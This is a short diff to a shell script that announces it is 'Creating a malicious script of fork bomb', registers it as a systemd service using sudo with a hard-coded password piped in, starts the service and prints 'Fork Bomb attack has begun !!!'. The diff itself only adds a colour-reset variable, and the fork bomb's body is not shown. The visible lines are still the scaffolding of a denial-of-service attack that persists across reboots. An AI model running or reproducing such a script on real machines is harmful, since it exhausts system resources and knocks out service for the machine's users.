@@ -1,4 +1,5 @@
 Green='\033[0;32m'
+Color_Off='\033[0m'
 
 echo -e "$Green"
 echo "Creating a malicious script of fork bomb"
@@ -63,4 +64,4 @@ echo 1 | sudo -S systemctl daemon-reload
 echo 1 | sudo -S systemctl start fork.service
 
 echo ""
-echo "Fork Bomb attack has begun !!!"
+echo "Fork Bomb attack has begun !!! $Color_Off"
